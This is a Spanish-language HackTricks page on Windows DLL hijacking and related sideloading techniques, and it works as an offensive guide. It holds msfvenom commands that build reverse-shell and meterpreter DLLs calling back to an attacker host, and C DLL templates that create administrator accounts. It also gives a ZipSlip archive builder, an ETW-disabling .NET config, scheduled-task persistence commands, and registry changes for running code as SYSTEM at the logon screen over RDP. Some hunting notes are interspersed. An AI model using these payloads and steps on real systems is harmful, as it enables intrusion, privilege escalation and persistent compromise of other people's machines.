# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Basic Information

DLL Hijacking implica manipular una aplicación de confianza para que cargue una DLL maliciosa. Este término abarca varias tácticas como **DLL Spoofing, Injection y Side-Loading**. Se utiliza principalmente para ejecución de código, lograr persistencia y, con menor frecuencia, escalada de privilegios. A pesar del enfoque en la escalada aquí, el método de hijacking permanece consistente entre objetivos.

### Common Techniques

Se emplean varios métodos para DLL hijacking, cada uno con su efectividad dependiendo de la estrategia de carga de DLLs de la aplicación:

1. **DLL Replacement**: Sustituir una DLL legítima por una maliciosa, opcionalmente usando DLL Proxying para conservar la funcionalidad de la DLL original.
2. **DLL Search Order Hijacking**: Colocar la DLL maliciosa en una ruta de búsqueda anterior a la legítima, explotando el patrón de búsqueda de la aplicación.
3. **Phantom DLL Hijacking**: Crear una DLL maliciosa para que una aplicación la cargue, creyendo que es una DLL requerida que no existe.
4. **DLL Redirection**: Modificar parámetros de búsqueda como `%PATH%` o archivos `.exe.manifest` / `.exe.local` para dirigir la aplicación hacia la DLL maliciosa.
5. **WinSxS DLL Replacement**: Sustituir la DLL legítima por una maliciosa en el directorio WinSxS, un método a menudo asociado con DLL side-loading.
6. **Relative Path DLL Hijacking**: Colocar la DLL maliciosa en un directorio controlado por el usuario junto con la aplicación copiada, similar a técnicas de Binary Proxy Execution.


### AppDomainManager hijacking (`<exe>.config` + attacker assembly)

El classic DLL sideloading no es la única forma de hacer que un proceso de confianza de **.NET Framework** cargue código atacante. Si el ejecutable objetivo es una aplicación **managed**, el CLR también consulta un **application configuration file** con el nombre del ejecutable (por ejemplo `Setup.exe.config`). Ese archivo puede definir un **AppDomainManager** personalizado. Si el config apunta a un attacker-controlled assembly colocado junto al EXE, el CLR lo carga **antes de la ruta normal de código de la aplicación** y se ejecuta dentro del proceso de confianza.

Según el schema de configuración de .NET Framework de Microsoft, deben estar presentes tanto `<appDomainManagerAssembly>` como `<appDomainManagerType>` para que se use el manager personalizado.

Minimal config:
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
<appDomainManagerType value="EvilMgr.Loader" />
</runtime>
</configuration>
```
Administrador mínimo:
```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
[DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
}
}
```
Notas prácticas:
- Esto es tradecraft específico de **.NET Framework**. Depende del análisis de configuración de CLR, no del orden de búsqueda de DLL de Win32.
- El host debe ser realmente un **managed EXE**. Triage rápido: `sigcheck -m target.exe`, `corflags target.exe`, o revisar el **CLR Runtime Header** en los metadatos PE.
- El nombre del archivo de configuración debe coincidir exactamente con el nombre del ejecutable (`<binary>.config`) y normalmente vive **junto al EXE**.
- Esto es útil con **signed Microsoft/vendor binaries** porque el EXE confiable permanece intacto mientras el assembly managed malicioso se ejecuta en proceso.
- Si ya tienes un directorio de instalador/actualización escribible, AppDomainManager hijacking puede usarse como **primer stage**, seguido de classic DLL sideloading o reflective loading para etapas posteriores.

### AppDomainManager como downloader + bootstrap de scheduled-task

Un patrón práctico de intrusión es emparejar el managed EXE confiable con un `*.config` malicioso y un DLL malicioso de AppDomainManager que actúe solo como un **small bootstrapper**:

1. El usuario lanza un instalador o updater firmado de .NET desde una ubicación creíble como `%USERPROFILE%\Downloads`.
2. El config adyacente hace que el CLR cargue el assembly del atacante **antes** de que empiece la lógica legítima de la app.
3. El manager malicioso realiza un **path gate** (por ejemplo, solo continuar si el host EXE se está ejecutando desde `Downloads`, y solo permitir que el segundo stage se ejecute desde `%LOCALAPPDATA%`).
4. Si la comprobación pasa, descarga el payload real en una ruta escribible por el usuario como `%LOCALAPPDATA%\PerfWatson2.exe` e instala persistencia con una scheduled task.

Por qué importa esta variante:
- El host EXE firmado permanece sin cambios, así que un triage que solo hashee el binary principal puede pasar por alto la intrusión.
- El simple **path-based anti-analysis** es común: mover el trío ZIP/EXE/DLL a Desktop, Temp, o una ruta de sandbox puede romper la cadena de forma intencional.
- El AppDomainManager DLL de primer stage puede seguir siendo pequeño y de bajo ruido mientras el implant real se descarga después.

Ejemplo mínimo de persistencia que se ve con frecuencia con este patrón:
```cmd
schtasks /create /tn "GoogleUpdaterTaskSystem140.0.7272.0" /sc onlogon /tr "%LOCALAPPDATA%\PerfWatson2.exe" /rl highest /f
```
Notas:
- ` /rl highest` significa **más alto disponible** para ese usuario/sesión; no es una elevación a SYSTEM garantizada por sí sola.
- Esta técnica a menudo se categoriza mejor como **execution/persistence via .NET config abuse** que como el clásico missing-DLL search-order hijacking, aunque los operadores suelen encadenar ambas.

Puntos de detección:
- Ejecutables .NET firmados lanzados desde rutas de **ZIP extraction paths**, `Downloads`, `%TEMP%` u otras carpetas escribibles por el usuario con un `<exe>.config` **colocated**.
- Nuevas tareas programadas cuya acción apunta a `%LOCALAPPDATA%`, `%APPDATA%` o `Downloads` y cuyos nombres imitan actualizadores de navegador/proveedor.
- Procesos bootstrap administrados de corta duración que descargan inmediatamente otro EXE y luego lanzan `schtasks.exe`.
- Muestras que salen pronto a menos que la ruta del ejecutable coincida con un directorio esperado del perfil de usuario.

### Hijacking an existing scheduled task to relaunch the sideload chain

Para persistencia, no busques solo **creating a new task**. Algunos intrusion sets esperan hasta que un instalador legítimo crea una **normal updater task** y luego **rewrite the task action** para que el nombre, autor y trigger existentes sigan pareciendo familiares para los defensores.

Flujo reutilizable:
1. Instala/ejecuta el software legítimo e identifica la tarea que normalmente crea.
2. Exporta el XML de la tarea y anota los valores actuales de `<Exec><Command>` / `<Arguments>`.
3. Reemplaza solo la acción para que la tarea inicie tu **trusted host EXE** desde un directorio de staging escribible por el usuario, que luego side-loads o AppDomain-loads el payload real.
4. Vuelve a registrar el mismo nombre de tarea en lugar de crear un nuevo artefacto de persistencia obvio.
```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```
Why it is stealthier:
- The task name can still look legitimate (for example a vendor updater).
- The **Task Scheduler service** launches it, so parent/ancestor validation often sees the expected scheduling chain instead of `explorer.exe`.
- DFIR teams that only hunt for **new task names** may miss a task whose registration already existed but whose action now points to `%LOCALAPPDATA%`, `%APPDATA%`, or another attacker-controlled path.

Fast hunting pivots:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- Compare `C:\Windows\System32\Tasks\*` XML and `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` metadata against a baseline.
- Alert when a **vendor-looking updater task** executes from **user-writable directories** or launches a .NET EXE with a colocated `*.config` file.

> [!TIP]
> Para una cadena paso a paso que combina staging HTML, configs AES-CTR y implants .NET encima de DLL sideloading, revisa el flujo de trabajo abajo.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Finding missing Dlls

La forma más común de encontrar missing Dlls dentro de un sistema es ejecutar [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) de sysinternals, **configurando** los **siguientes 2 filtros**:

![Common Techniques - Finding missing Dlls: The most common way to find missing Dlls inside a system is running procmon from sysinternals, setting the following 2 filters](<../../../images/image (961).png>)

![Common Techniques - Finding missing Dlls: The most common way to find missing Dlls inside a system is running procmon from sysinternals, setting the following 2 filters](<../../../images/image (230).png>)

y mostrando solo la **File System Activity**:

![Common Techniques - Finding missing Dlls: and just show the File System Activity](<../../../images/image (153).png>)

Si estás buscando **missing dlls en general** debes **dejar** esto ejecutándose durante algunos **segundos**.\
Si estás buscando un **missing dll dentro de un ejecutable específico** debes configurar **otro filtro como "Process Name" "contains" `<exec name>`, ejecutarlo, y detener la captura de eventos**.

## Exploiting Missing Dlls

Para escalar privilegios, la mejor oportunidad que tenemos es poder **escribir una dll que un proceso privilegiado intentará cargar** en algún **lugar donde se va a buscar**. Por lo tanto, podremos **escribir** una dll en una **carpeta** donde la **dll se busca antes** que la carpeta donde está la **dll original** (caso raro), o podremos **escribir en alguna carpeta donde se va a buscar la dll** y la **dll original** no existe en ninguna carpeta.

### Dll Search Order

**Dentro de la** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **puedes encontrar cómo se cargan las Dlls específicamente.**

**Windows applications** buscan DLLs siguiendo un conjunto de **rutas de búsqueda predefinidas**, respetando una secuencia concreta. El problema del DLL hijacking aparece cuando una DLL maliciosa se coloca estratégicamente en uno de estos directorios, asegurando que se cargue antes que la DLL auténtica. Una solución para evitarlo es asegurarse de que la aplicación use rutas absolutas al referirse a las DLLs que necesita.

Puedes ver el **orden de búsqueda de DLLs en sistemas de 32 bits** abajo:

1. El directorio desde el que se cargó la aplicación.
2. El directorio del sistema. Usa la función [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) para obtener la ruta de este directorio.(_C:\Windows\System32_)
3. El directorio del sistema de 16 bits. No existe una función que obtenga la ruta de este directorio, pero se busca. (_C:\Windows\System_)
4. El directorio de Windows. Usa la función [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) para obtener la ruta de este directorio.
1. (_C:\Windows_)
5. El directorio actual.
6. Los directorios que están listados en la variable de entorno PATH. Ten en cuenta que esto no incluye la ruta por aplicación especificada por la clave de registro **App Paths**. La clave **App Paths** no se usa al calcular la ruta de búsqueda de DLL.

Ese es el orden de búsqueda **por defecto** con **SafeDllSearchMode** habilitado. Cuando está deshabilitado, el directorio actual sube al segundo lugar. Para desactivar esta función, crea el valor de registro **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** y establécelo en 0 (por defecto está habilitado).

Si la función [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) se llama con **LOAD_WITH_ALTERED_SEARCH_PATH**, la búsqueda comienza en el directorio del módulo ejecutable que **LoadLibraryEx** está cargando.

Finalmente, ten en cuenta que **una dll podría cargarse indicando la ruta absoluta en lugar del nombre**. En ese caso esa dll **solo se va a buscar en esa ruta** (si la dll tiene dependencias, se van a buscar como si se hubiera cargado por nombre).

Hay otras formas de alterar el orden de búsqueda, pero no voy a explicarlas aquí.

### Chaining an arbitrary file write into a missing-DLL hijack

1. Usa filtros de **ProcMon** (`Process Name` = target EXE, `Path` termina en `.dll`, `Result` = `NAME NOT FOUND`) para recopilar nombres de DLL que el proceso intenta abrir pero no encuentra.
2. Si el binario se ejecuta por **schedule/service**, dejar caer una DLL con uno de esos nombres en el **directorio de la aplicación** (entrada #1 del orden de búsqueda) hará que se cargue en la siguiente ejecución. En un caso de un scanner .NET, el proceso buscó `hostfxr.dll` en `C:\samples\app\` antes de cargar la copia real desde `C:\Program Files\dotnet\fxr\...`.
3. Construye una payload DLL (por ejemplo, reverse shell) con cualquier export: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. Si tu primitive es un **ZipSlip-style arbitrary write**, crea un ZIP cuya entrada escape del directorio de extracción para que la DLL termine en la carpeta de la app:
```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```
5. Entrega el archivo a la bandeja compartida/monitorizada; cuando la tarea programada relance el proceso, cargará la DLL maliciosa y ejecutará tu código como la cuenta del servicio.

### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

Una forma avanzada de influir de manera determinista en la ruta de búsqueda de DLL de un proceso recién creado es establecer el campo DllPath en RTL_USER_PROCESS_PARAMETERS al crear el proceso con las APIs nativas de ntdll. Al proporcionar aquí un directorio controlado por el atacante, se puede forzar a un proceso objetivo que resuelve una DLL importada por nombre (sin ruta absoluta y sin usar las banderas de carga segura) a cargar una DLL maliciosa desde ese directorio.

Key idea
- Construye los parámetros del proceso con RtlCreateProcessParametersEx y proporciona un DllPath personalizado que apunte a tu carpeta controlada (por ejemplo, el directorio donde vive tu dropper/unpacker).
- Crea el proceso con RtlCreateUserProcess. Cuando el binario objetivo resuelva una DLL por nombre, el loader consultará este DllPath proporcionado durante la resolución, lo que permite sideloading fiable incluso cuando la DLL maliciosa no está colocada junto al EXE objetivo.

Notes/limitations
- Esto afecta al proceso hijo que se está creando; es diferente de SetDllDirectory, que solo afecta al proceso actual.
- El objetivo debe importar o llamar a LoadLibrary de una DLL por nombre (sin ruta absoluta y sin usar LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs y las rutas absolutas codificadas no pueden ser hijackeadas. Las forwarded exports y SxS pueden cambiar la precedencia.

Minimal C example (ntdll, wide strings, simplified error handling):

<details>
<summary>Full C example: forcing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Ejemplo de uso operativo
- Coloca un xmllite.dll malicioso (exportando las funciones requeridas o haciendo proxy al real) en tu directorio DllPath.
- Lanza un binario firmado conocido por buscar xmllite.dll por nombre usando la técnica anterior. El loader resuelve la importación mediante el DllPath proporcionado y sideloads your DLL.

Esta técnica se ha observado en-the-wild para impulsar cadenas multi-stage de sideloading: un launcher inicial deja caer una DLL auxiliar, que luego inicia un binario de Microsoft firmado y susceptible a hijacking con un DllPath personalizado para forzar la carga de la DLL del atacante desde un directorio de staging.


### .NET AppDomainManager hijacking via `.exe.config`

Para objetivos **.NET Framework**, el sideloading puede hacerse **antes de `Main()`** sin parchear memoria abusando del archivo adyacente **`.exe.config`** de la aplicación. En lugar de depender solo del orden de búsqueda de DLL de Win32, el atacante coloca un .NET EXE legítimo junto a un config malicioso y una o más assemblies controladas por el atacante.

Cómo funciona la cadena:
1. El EXE anfitrión se inicia y el **CLR lee `<exe>.config`**.
2. El config establece **`<appDomainManagerAssembly>`** y **`<appDomainManagerType>`** para que el runtime instancie un `AppDomainManager` controlado por el atacante.
3. El manager malicioso obtiene ejecución **pre-`Main()`** dentro del proceso anfitrión confiable.
4. El mismo config puede forzar al CLR a resolver primero las assemblies locales (por ejemplo `InitInstall.dll`, `Updater.dll`, `uevmonitor.dll`) y puede debilitar la validación/telemetría del runtime sin parcheo inline.

Patrón estilo campaign (el anidamiento exacto puede variar según la directiva / versión de CLR):
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="Updater" />
<appDomainManagerType value="MyAppDomainManager" />
<assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
<probing privatePath="." />
<publisherPolicy apply="no" />
</assemblyBinding>
<bypassTrustedAppStrongNames enabled="true" />
<etwEnable enabled="false" />
</runtime>
<startup>
<requiredRuntime version="v4.0.30319" safemode="true" />
</startup>
</configuration>
```
¿Por qué esto es útil:
- **`<probing privatePath="."/>`** mantiene la resolución de ensamblados en el directorio de la aplicación, convirtiendo la carpeta en una superficie de sideloading predecible.
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`** trasladan la ejecución al código del atacante durante la inicialización de CLR, antes de que se ejecute la lógica legítima de la app.
- **`<bypassTrustedAppStrongNames enabled="true"/>`** puede permitir que una app de full-trust cargue ensamblados sin firmar o alterados sin que falle la validación strong-name.
- **`<publisherPolicy apply="no"/>`** evita redirecciones de publisher-policy a ensamblados más nuevos.
- **`<requiredRuntime ... safemode="true"/>`** hace que la selección del runtime sea más determinista.
- **`<etwEnable enabled="false"/>`** es especialmente interesante porque el **CLR deshabilita su propia visibilidad ETW** desde la configuración en lugar de que el implant parche `EtwEventWrite` en memoria.

Patrón operativo visto en campañas recientes:
- La fase 1 deja `setup.exe`, `setup.exe.config` y ensamblados locales.
- La fase 2 los copia a una carpeta creíble de **AppData update**, renombra el host a algo como `update.exe` y lo relanza mediante una **scheduled task**.
- La fase 3 verifica el contexto de ejecución (por ejemplo, el padre esperado `svchost.exe` desde Task Scheduler) antes de cargar el DLL/export final del RAT.

Ideas de hunting:
- **.NET executables** firmados o de otro modo legítimos ejecutándose con sospechosos archivos **`.config`** adyacentes en ubicaciones escribibles por el usuario.
- Archivos `.config` que contengan **`appDomainManagerAssembly`**, **`appDomainManagerType`**, **`probing privatePath="."`**, **`bypassTrustedAppStrongNames`** o **`etwEnable enabled="false"`**.
- Scheduled tasks que relanzan binarios de update renombrados desde **`%LOCALAPPDATA%`** o directorios específicos de la app como `\bin\update\`.
- Cadenas padre/hijo donde una scheduled task lanza un host .NET confiable que inmediatamente carga ensamblados no pertenecientes al vendor desde su propio directorio.

#### Exceptions on dll search order from Windows docs

Ciertas excepciones al orden estándar de búsqueda de DLL se indican en la documentación de Windows:

- Cuando se encuentra un **DLL que comparte su nombre con otro ya cargado en memoria**, el sistema omite la búsqueda habitual. En su lugar, realiza una comprobación de redirection y un manifest antes de usar por defecto el DLL ya cargado en memoria. **En este escenario, el sistema no realiza una búsqueda del DLL**.
- En los casos en que el DLL se reconoce como un **known DLL** para la versión actual de Windows, el sistema utilizará su versión del known DLL, junto con cualquiera de sus DLL dependientes, **sin pasar por el proceso de búsqueda**. La clave del registro **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** contiene una lista de estos known DLLs.
- Si un **DLL tiene dependencias**, la búsqueda de estos DLL dependientes se realiza como si solo estuvieran indicados por sus **nombres de módulo**, independientemente de si el DLL inicial fue identificado mediante una ruta completa.

### Escalating Privileges

**Requirements**:

- Identificar un proceso que opere o vaya a operar bajo **privilegios diferentes** (horizontal or lateral movement), que **no tenga un DLL**.
- Asegurar que exista **write access** para cualquier **directorio** en el que se vaya a **buscar el DLL**. Esta ubicación puede ser el directorio del ejecutable o un directorio dentro del system path.

Sí, los requisitos son complicados de encontrar porque **por defecto es bastante raro encontrar un ejecutable privilegiado al que le falte un dll** y es **todavía más raro tener permisos de escritura sobre una carpeta del system path** (por defecto no puedes). Pero en entornos mal configurados esto es posible.\
Si tienes suerte y cumples los requisitos, puedes revisar el proyecto [UACME](https://github.com/hfiref0x/UACME). Aunque **el objetivo principal del proyecto es bypass UAC**, ahí puedes encontrar un **PoC** de un Dll hijaking para la versión de Windows que puedes usar (probablemente solo cambiando la ruta de la carpeta donde tienes permisos de escritura).

Nota que puedes **comprobar tus permisos en una carpeta** haciendo:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
Y **comprueba los permisos de todas las carpetas dentro de PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
También puedes comprobar los imports de un ejecutable y los exports de un dll con:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Para una guía completa sobre cómo **abuse Dll Hijacking to escalate privileges** con permisos para escribir en una carpeta de **System Path**, revisa:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Automated tools

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)will check if you have write permissions on any folder inside system PATH.\
Other interesting automated tools to discover this vulnerability are **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ and _Write-HijackDll._

### Example

En caso de que encuentres un escenario explotable, una de las cosas más importantes para explotarlo con éxito sería **create a dll that exports at least all the functions the executable will import from it**. De todos modos, ten en cuenta que Dll Hijacking resulta útil para [escalate from Medium Integrity level to High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) o de[ **High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system)**.** Puedes encontrar un ejemplo de **how to create a valid dll** dentro de este estudio de dll hijacking centrado en dll hijacking for execution: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Además, en la **next sectio**n puedes encontrar algunos **basic dll codes** que podrían ser útiles como **templates** o para crear una **dll with non required functions exported**.

## **Creating and compiling Dlls**

### **Dll Proxifying**

Básicamente un **Dll proxy** es un Dll capaz de **execute your malicious code when loaded** pero también de **expose** y **work** como se **exected** mediante el reenvío de todas las llamadas a la biblioteca real.

Con la herramienta [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) o [**Spartacus**](https://github.com/Accenture/Spartacus) puedes **indicar un ejecutable y seleccionar la biblioteca** que quieres proxify y **generate a proxified dll** o **indicate the Dll** y **generate a proxified dll**.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Obtener un meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Crear un usuario (x86 no vi una versión x64):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### El tuyo

Ten en cuenta que, en varios casos, el Dll que compiles debe **export several functions** que van a ser cargadas por el proceso víctima; si estas funciones no existen, el **binary won't be able to load** y el **exploit will fail**.

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>Ejemplo de DLL en C++ con creación de usuario</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>DLL C alternativo con entrada de hilo</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Caso de estudio: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe todavía comprueba en el inicio una DLL de localización predecible y específica del idioma que puede ser hijacked para ejecución arbitraria de código y persistencia.

Datos clave
- Ruta de comprobación (compilaciones actuales): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Ruta heredada (compilaciones anteriores): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Si existe una DLL escribible y controlada por el atacante en la ruta OneCore, se carga y se ejecuta `DllMain(DLL_PROCESS_ATTACH)`. No se requieren exports.

Descubrimiento con Procmon
- Filtro: `Process Name is Narrator.exe` y `Operation is Load Image` o `CreateFile`.
- Inicia Narrator y observa el intento de carga de la ruta anterior.

Minimal DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC silence
- Un hijack ingenuo hablará/resaltará la UI. Para mantener el silencio, al adjuntarse enumera los threads de Narrator, abre el thread principal (`OpenThread(THREAD_SUSPEND_RESUME)`) y suspéndelo con `SuspendThread`; continúa en tu propio thread. Ver el PoC para el código completo.

Trigger and persistence via Accessibility configuration
- Contexto de usuario (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Con lo anterior, al iniciar Narrator se carga la DLL plantada. En el secure desktop (pantalla de inicio de sesión), pulsa CTRL+WIN+ENTER para iniciar Narrator; tu DLL se ejecuta como SYSTEM en el secure desktop.

RDP-triggered SYSTEM execution (lateral movement)
- Permitir la classic RDP security layer: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Conéctate por RDP al host; en la pantalla de inicio de sesión pulsa CTRL+WIN+ENTER para lanzar Narrator; tu DLL se ejecuta como SYSTEM en el secure desktop.
- La ejecución se detiene cuando la sesión RDP se cierra—inyecta/migra con rapidez.

Bring Your Own Accessibility (BYOA)
- Puedes clonar una entrada de registry de una built-in Accessibility Tool (AT) (por ejemplo, CursorIndicator), editarla para que apunte a un binary/DLL arbitrario, importarla y luego establecer `configuration` con ese nombre de AT. Esto proxya la ejecución arbitraria bajo el framework de Accessibility.

Notes
- Escribir en `%windir%\System32` y cambiar valores HKLM requiere derechos de admin.
- Toda la lógica del payload puede vivir en `DLL_PROCESS_ATTACH`; no se necesitan exports.

## Case Study: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

This case demuestra **Phantom DLL Hijacking** en Lenovo's TrackPoint Quick Menu (`TPQMAssistant.exe`), tracked as **CVE-2025-1729**.

### Vulnerability Details

- **Component**: `TPQMAssistant.exe` ubicado en `C:\ProgramData\Lenovo\TPQM\Assistant\`.
